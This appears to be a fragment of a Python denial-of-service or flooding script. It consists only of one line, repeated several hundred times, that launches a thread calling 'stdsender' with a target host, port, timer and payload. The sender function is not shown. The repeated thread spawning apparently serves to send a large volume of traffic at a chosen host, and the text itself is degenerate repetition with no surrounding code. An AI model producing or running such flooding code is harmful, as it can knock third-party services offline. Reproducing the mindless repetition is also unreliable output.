					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
